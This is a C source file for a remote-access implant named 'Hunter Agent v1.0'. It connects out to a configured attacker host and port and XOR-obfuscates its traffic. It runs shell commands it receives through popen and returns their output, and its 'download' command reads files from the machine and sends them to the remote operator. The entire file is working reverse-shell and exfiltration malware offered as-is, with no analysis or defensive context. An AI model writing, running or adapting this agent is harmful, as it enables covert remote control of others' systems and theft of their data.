#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536

#define SIZE 1024

int sendfile(FILE* fp, int fd, char* key)
{
        char data[SIZE] = {0};
        
        while(fgets(data, SIZE, fp) != NULL) {
                char* xordata = XOR(data, key, SIZE, strlen(key));
                if (send(fd, xordata, sizeof(data), 0) == -1) {
                        exit(1);
                }
                bzero(data, SIZE);
                free(xordata);
        }
        char* eof = "--HEADHUNTER EOF--";
        char* xoreof = XOR(eof, key, strlen(eof), strlen(key));
        send(fd, xoreof, strlen(eof), 0);
        free(xoreof);
        return 0;
}

int recvfile(char* filename, int fd, char* key)
{
        int n;
        FILE *fp;
        char buffer[SIZE];
        fp = fopen(filename, "w");
        while(1){
                n = recv(fd, buffer, SIZE, 0);
                if (n <= 0){
                        break;
                        return 0;
                }
                char* xorbuffer = XOR(buffer, key, n, strlen(key));
                if(strcmp(xorbuffer, "--HEADHUNTER EOF--") == 0){
                        printf("[+] File successfully written to \"out.hunter\"\n");
                        return 0;
                }
                fprintf(fp, "%s", xorbuffer);
                bzero(buffer, SIZE);
                free(xorbuffer);
        }

  return 0;
}

int main(void)
{
	int connection_established;
	char* ip = LHOST;
	char* key = KEY;
	int keylen = strlen(key);
	int port = PORT;
	int n = 0;
	char buf[MAXBUF];

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	do {
		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
	} while(connection_established != 0);

	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
	write(sock, xorhello, 18);

	while (connection_established == 0)
	{
		while((n = read(sock, buf, MAXBUF)) > 0)
		{
			char* xorbuf = XOR(buf, key, n, keylen);
			// TODO: Revamp argument parsing (there's a better way! :)
			if(strncmp(xorbuf, "help\n", 5) == 0)
			{
				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
				write(sock, xorhelp, strlen(MSG_HELP));
			}
			
			else if(str_starts_with(xorbuf, "shell") == 0)
			{

				int status = 0;
				pid_t wpid, child_pid;
				FILE* fp;
				
				
				char* cmd = split(xorbuf, " ");			
	
				if((child_pid = fork()) == 0)
				{
					char shell_msg[50];
					snprintf(shell_msg, 50, "\n[+] Executing command on PID %i\n\n", getpid());
					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
					write(sock, xorshellmsg, strlen(shell_msg));

					// Create a child process and run command inside of it
					fp = popen(cmd, "r");
					if(fp == NULL) {
					    char* error = "Failed to run command\n";
					    char* xorerror = XOR(error, key, strlen(error), keylen);
					    write(sock, xorerror, strlen(error));
					    
					}
					char path[2050];
					char command[12000];
					while (fgets(path, sizeof(path), fp) != NULL) {
					    strncat(command, path, strlen(path));
					}
					char* xordata = XOR(command, key, strlen(command), keylen);
					write(sock, xordata, strlen(command));
					free(xordata);
					
					exit(EXIT_SUCCESS);
				}
				// Make the parent process wait for child process to terminate
		//		while ((wpid = wait(&status)) > 0);

			}
			else if(str_starts_with(xorbuf, "download") == 0){
			
				char* cmd = split(xorbuf, " ");
				cmd[strlen(cmd)-1] = '\0'; // Remove newline
				FILE* fp;
				fp = fopen(cmd, "r");
				if(fp == NULL){
					
					char* openerr = "[-] Error opening file\n";
					char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
					write(sock, xoropenerr, strlen(openerr));
					free(xoropenerr);
					break;

				}
				else{

					char* download = "--HUNTER DOWNLOAD--";
					char* xordownload = XOR(download, key, strlen(download), keylen);
					char confirm[5];
					write(sock, xordownload, strlen(download));
					read(sock, confirm, 5);
					char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
					if(strcmp(xorconfirm, "OK") == 0){
						sendfile(fp, sock, key);
					}
					else{
						continue;
					}
				}
			
			}
			else if(strncmp(xorbuf, "\n", 1) == 0)
			{
				char* xornewline = XOR("\n", key, 1, keylen);
				write(sock, xornewline, 1);
				free(xornewline);
		
			}
			else if(str_starts_with(xorbuf, "exit\n") == 0){

				char* disconnect = "[+] Hunter agent: OK\n";
				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
				write(sock, xordisconnect, strlen(disconnect));
				free(xordisconnect);
				return 0;
			}
			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				write(sock, xorinvalid, strlen(MSG_INVALID));
			}		
			
			memset(buf, '\0', strlen(buf));
			free(xorbuf);
		}
	}

	return 0;
}
